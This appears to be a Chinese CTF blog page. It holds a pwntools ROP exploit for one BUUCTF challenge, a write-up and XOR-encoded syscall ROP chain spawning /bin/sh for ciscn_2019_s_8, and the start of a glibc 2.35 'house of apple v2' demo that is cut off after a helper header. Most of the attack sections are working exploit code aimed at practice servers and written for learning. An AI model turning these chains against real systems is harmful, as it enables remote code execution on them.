<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">poprdi = <span class="number">0x400c03</span></span><br><span class="line">poprsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400A9B</span></span><br><span class="line">poprbp = <span class="number">0x400870</span></span><br><span class="line">gad = <span class="number">0x400BFA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want to send?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x2000</span>).encode())</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(<span class="number">0</span>) + cyclic(<span class="number">4104</span> - <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># canary</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(gad)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)	<span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)	<span class="comment"># pop r13</span></span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)	<span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop r15</span></span><br><span class="line">payload += p64(<span class="number">0x400BE0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(poprbp)</span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(base + <span class="number">0x4f322</span>) * <span class="number">4</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu194-ciscn_2019_s_8"><a class="markdownIt-Anchor" href="#buu194-ciscn_2019_s_8"></a> buu194-ciscn_2019_s_8</h1>
<p>这道题就是考ROP，一个静态编译，能够找到很多的gadget。下面使用的是<code>system('/bin/sh')</code>的方式。首先需要将字符串/bin/sh写到一个地方，通过对程序的逆向分析可以找到read函数的地址。输入完成之后就是调用syscall。尤其需要注意get shell的参数。第一个参数（rdi）保存字符串<code>/bin/sh</code>的地址，第二个参数（rsi）保存字符串<code>sh</code>的<strong>二重指针地址</strong>，注意是二重指针。因为<code>/bin/sh</code>里面已经有<code>sh</code>，所以直接可以偏移5个字符，不过我们传入rsi的值应该是保存有这个偏移5个字节的地址的地址，那么之前在写的时候就需要顺便写一个地址值。然后rdx赋值0即可。<br />
另外本题有一个函数会对输入进行处理，经过简单分析即可得知是为每个字节异或0x66，写gadget的时候异或一下就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25478</span>)</span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x4006e6</span></span><br><span class="line">poprsi = <span class="number">0x4040fe</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">poprsp = <span class="number">0x400d22</span></span><br><span class="line">poprax = <span class="number">0x449b9c</span></span><br><span class="line">poprbx = <span class="number">0x4005ee</span></span><br><span class="line">poprcx = <span class="number">0x400be2</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">pushrsp = <span class="number">0x482997</span>	<span class="comment"># call rdx</span></span><br><span class="line">poprsirbp = <span class="number">0x40f99e</span></span><br><span class="line">movrdirbp = <span class="number">0x422c45</span>	<span class="comment"># call rax</span></span><br><span class="line">syscall = <span class="number">0x44C177</span>	<span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">read = <span class="number">0x449be0</span></span><br><span class="line">bss = <span class="number">0x6BC300</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span> + <span class="number">8</span> - <span class="number">8</span> * <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(pushrsp ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(bss - 0x300 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0x1000 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(7 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0xA ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(read ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0x2 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0xbss ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0) * 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64((bss + <span class="number">8</span>) ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(syscall ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Please enter your Password: &#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(bss + <span class="number">5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">glibc 2.35 pwn——house of apple v2 示例程序</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-20 00:14:03 / Modified: 00:14:51" itemprop="dateCreated datePublished" datetime="2023-03-20T00:14:03+08:00">2023-03-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>31k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>28 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>house of apple v2与v1不同，可以直接控制程序执行流，获得shell。<br />
主要参考资料：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">传送门</a></p>
<p>v2有多种程序执行路径，每一条执行路径对于伪造的<code>FILE</code>结构体、<code>_wide_data</code>结构体都有不同的要求。在学习本漏洞时要学会举一反三，只要了解了基本原理，这些路径实际上我们是可以自己推出来的。</p>
<p><strong>小建议：读者可以使用IDA打开ubuntu 22.04本机的libc并保存i64文件，由于libc文件中保存的<code>_IO_jump_t</code>结构体中有很多函数都没有符号，因此在学习FSOP的过程中可以匹配<code>_IO_jump_t</code>结构体本身的名字以及其中含有的函数名，这样在下一次查看时就不需要再去推断某一个位置函数的名字了。musl libc同理。</strong></p>
<p>后续笔者会将自己写的所有演示代码上传到github供各位读者学习。</p>
<p>头文件util.h：含说明文字的颜色输出、获取libc基地址等实用函数（后续可能会进一步完善，添加新的函数与功能）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-3-16.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_BLACK_HEAD        <span class="string">&quot;\033[1;30m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_RED_HEAD          <span class="string">&quot;\033[1;31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_GREEN_HEAD        <span class="string">&quot;\033[1;32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_YELLOW_HEAD       <span class="string">&quot;\033[1;33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_BLUE_HEAD         <span class="string">&quot;\033[1;34m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_PURPLE_HEAD       <span class="string">&quot;\033[1;35m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_DARK_GREEN_HEAD   <span class="string">&quot;\033[1;36m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT_WHITE_HEAD        <span class="string">&quot;\033[1;37m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> victim[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_libc_base</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">size_t</span>)<span class="built_in">puts</span> - <span class="number">0x80ED0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_UTIL_H</span></span></span><br></pre></td></tr></table></figure>
<p>源文件house_of_apple_2.c：主要演示代码，通过修改宏定义可选择使用3条执行路径中的1条。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 